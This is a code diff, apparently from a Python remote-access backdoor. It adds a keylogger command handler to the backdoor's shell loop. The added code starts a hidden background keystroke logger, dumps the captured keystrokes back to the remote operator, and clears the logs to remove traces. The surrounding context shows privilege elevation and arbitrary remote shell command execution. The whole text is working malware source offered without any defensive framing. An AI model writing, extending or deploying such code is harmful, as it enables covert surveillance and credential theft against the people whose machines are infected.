@@ -267,6 +267,56 @@ def shell():
                 print("[*] Elevating privilege...")
                 response = elevate_privilege()
                 reliable_send("Successfully elevated privilege")
+            elif command.startswith('keylogger'):
+                print(f"[*] Executing keylogger command: {command}")
+                try:
+                    cmd = command.split(' ')[1]
+                    if not hasattr(shell, '_keylogger'):
+                        shell._keylogger = None
+                        shell._keylogger_thread = None
+                    
+                    if cmd == 'start':
+                        if shell._keylogger is None:
+                            shell._keylogger = keylogger.Keylogger()
+                            shell._keylogger_thread = threading.Thread(target=shell._keylogger.start)
+                            shell._keylogger_thread.daemon = True
+                            shell._keylogger_thread.start()
+                            reliable_send({'success': True, 'message': 'Keylogger started successfully'})
+                        else:
+                            reliable_send({'error': 'Keylogger is already running'})
+                    
+                    elif cmd == 'stop':
+                        if shell._keylogger:
+                            shell._keylogger.self_destruct()
+                            shell._keylogger = None
+                            shell._keylogger_thread = None
+                            reliable_send({'success': True, 'message': 'Keylogger stopped successfully'})
+                        else:
+                            reliable_send({'error': 'No active keylogger session'})
+                    
+                    elif cmd == 'dump':
+                        if shell._keylogger:
+                            try:
+                                logs = shell._keylogger.read_logs()
+                                reliable_send({'success': True, 'output': logs})
+                            except Exception as e:
+                                reliable_send({'error': f'Failed to read logs: {str(e)}'})
+                        else:
+                            reliable_send({'error': 'No active keylogger session'})
+                    
+                    elif cmd == 'clear':
+                        if shell._keylogger:
+                            try:
+                                shell._keylogger.overwrite_file()
+                                reliable_send({'success': True, 'message': 'Logs cleared successfully'})
+                            except Exception as e:
+                                reliable_send({'error': f'Failed to clear logs: {str(e)}'})
+                        else:
+                            reliable_send({'error': 'No active keylogger session'})
+                    else:
+                        reliable_send({'error': f'Unknown keylogger command: {cmd}'})
+                except Exception as e:
+                    reliable_send({'error': f'Keylogger error: {str(e)}'})
             else:
                 print(f"[*] Executing: {command}")
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
